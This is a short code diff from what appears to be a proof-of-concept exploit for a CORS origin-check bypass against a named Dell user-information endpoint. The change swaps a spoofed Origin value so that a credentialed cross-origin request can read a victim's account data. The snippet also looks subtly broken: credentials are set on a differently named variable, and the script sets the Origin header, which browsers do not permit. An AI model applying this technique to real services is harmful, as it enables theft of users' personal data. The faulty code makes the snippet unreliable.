@@ -11,7 +11,7 @@
         // Craft a request with the desired Origin Header value
         var xhr = new XMLHttpRequest();
         xhr.open('GET', 'https://ctm.dell.com/CTMService/ctm-user-management-service/v2/userInfo', true);
-        xhr.setRequestHeader('Origin', 'https://fake.site/dell.com');
+        xhr.setRequestHeader('Origin', 'https://fake.site.dell.com');
         xhttp.withCredentials = true;
         xhr.onreadystatechange = function () {
             if (xhr.readyState == 4 && xhr.status == 200) {
